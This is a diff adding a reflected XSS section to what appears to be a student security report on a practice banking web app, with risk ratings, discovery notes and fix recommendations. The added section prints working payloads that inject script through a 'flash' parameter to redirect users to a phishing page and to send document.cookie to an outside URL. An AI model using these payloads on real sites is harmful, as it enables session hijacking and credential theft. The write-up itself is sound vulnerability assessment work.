@@ -2,6 +2,55 @@
 
 \section{Reflected XSS}
 
+\subsection{Observation}
+We discovered that the GET parameter \emph{flash} can be used in any page of the application for reflected XSS (Cross Site Scripting) attacks. One example, where reflected XSS can be applied is on the register page:
+\begin{verbatim}
+/sc-course/views/users/register.php?flash=<malicious code>
+\end{verbatim}
+The code planted by an attacker within the malicious code tag is executed in the users browser. The attacker needs to social engineer the user into clicking on a constructed link. This link may look legitimate, since it points to a web site the user trusts (in this case, his bank). This way an attacker can potentially bait a user into clicking the link, at which point the malicious code gets reflected back to the user and is executed. 
+
+There is a variety of potential attacks that become possible through exploitation of this vulnerability. For example the attacker could redirect the user to a phishing site:
+\begin{lstlisting}[caption= Automatic Redirect to Phishing Site,label=listing:first_test]
+register.php?flash=<script>window.location.href=
+    "http://en.wikipedia.org/wiki/Phishing"</script>
+\end{lstlisting}
+This site could be made to look exactly like the original site, but actually be run by the attacker, capturing any inputs the user makes (for example, his login credentials). Due to the imitation of the original site and the automatic redirect the user might not notice any difference. Thinking he is still on the banking site he might try to login normally, at which points his login credentials are compromised.
+
+In the next example, we steal the users session, by baiting him to click on a link that seemingly leads to his banking site:
+\begin{lstlisting}[caption= Stealing SessionID,label=listing:first_test]
+register.php?flash=<script>var userCookie = document.cookie; var attackSite = "http://en.wikipedia.org/wiki/Phishing?stolenCookie="; window.location.replace(attackSite.concat(userCookie));</script>
+\end{lstlisting}
+The user may be tempted to click on this link, since it is pointing to a site he trusts. However, the malicious code gets executed by the browser and automatically sends the cookie containing the session ID to the attacker. The links can be obfuscated to make their malicious contents less obvious to more knowledgable users. We can also place the link on the banking site itself, to make it look even more legitimate:
+\begin{lstlisting}[caption= Stealing SessionID via Link on Banking Site,label=listing:first_test]
+register.php?flash=<script>var userCookie=document.cookie; document.write("<a href= http://en.wikipedia.org/wiki/Phishing?stolenCookie=\"". concat(userCookie). concat("\"> Thank you for registering, click here to login. </a>")); </script>
+\end{lstlisting}
+
+
+Likelihood: high \newline
+
+Impact: medium-high\newline
+
+Risk: high\newline
+
+\subsection{Discovery}
+
+This vulnearbility was very easy to discover. The \emph{flash} parameter is used throughout all parts of the application to display messages. It is very intuitive to try and alter its outputs. Since no input validation is done, it becomes a very obvious injection point for reflected XSS attacks. After discovering this vulnerability we also checked with ZAP, whether any additional warnings or results would show up. ZAP noted, that the HTTPOnly flag was not set for the cookies containing the session ID. Therefore the user cookies were accessible through javascript and could be transmitted to an attacker site quite easily.
+
+\subsection{Likelihood}
+Even with only very basic skills in javascript and some knowledge about XSS attacks it is possible to steal the users session cookie and therefore impersonate any users that can be baited into clicking on a link to their banking site.
+
+\subsection{Implication}
+It is potentially possible to obtain sensitive user or employee data by running a phishing site in combination with the reflected XSS attack. Therefore this vulnerability can be used as an attack vector, to potentially obtain user or employee credentials. These can then be used for new attacks on the system.
+
+In a different attack it is potentially possible to hijack sessions of logged in users or employes, simply by baiting them into clicking on a link that leads to their banking site. 
+
+\subsection{Recommendations}
+To prevent Cross-Site-Scripting attacks, the user input has to be sanitized before inserted into the database. Go to \url{https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)} for more information. \newline
+This observation relates to the OWASP Top-10 issues A3 - Cross-Site-Scripting
+
+\subsection{Comparison with our App}
+We tried to avoid reflected XSS attacks by not using any GET parameters and generally sanitizing input that is reflected back to the user or inserted into the database.
+
 \section{Persistent XSS}
 
 \subsection{Observation}
@@ -24,7 +73,7 @@ Risk: high\newline
 
 \subsection{Discovery}
 
-This vulnerability was discovered by simply testing the possible inputs for all text fields. By inserting a simple alert() command, we checked if our input was sanitized before inserted into the database. Obviously that's not the case for the name field. This vulnerability was not detected by \texit{wapiti}, which is especially searching for possible XSS attacks.
+This vulnerability was discovered by simply testing the possible inputs for all text fields. By inserting a simple alert() command, we checked if our input was sanitized before inserted into the database. Obviously that's not the case for the name field. This vulnerability was not detected by \textit{wapiti}, which is especially searching for possible XSS attacks.
 
 \subsection{Likelihood}
 Exploiting this vulnerability requires basic technical skills. The attacker has to know about the basics of a XSS attack and basic java-script commands. It is possible to exploit this vulnerability from Internet as normal user.
